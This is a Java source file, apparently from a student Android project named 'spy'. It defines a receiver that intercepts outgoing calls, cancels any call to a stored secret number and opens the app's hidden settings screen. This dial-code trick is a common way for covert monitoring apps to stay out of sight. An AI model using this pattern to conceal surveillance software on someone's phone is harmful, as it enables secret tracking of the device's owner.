package edu.uj.jkordas.spy.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import edu.uj.jkordas.spy.settings.PrefActivity;
import edu.uj.jkordas.spy.settings.Preferences;

public class OutgoingCallReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        if (phoneNumber.equals(Preferences.getSecretCode(context))) {
            this.setResultData(null);

            Intent pi = new Intent(context, PrefActivity.class);
            pi.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(pi);
        }
    }

}
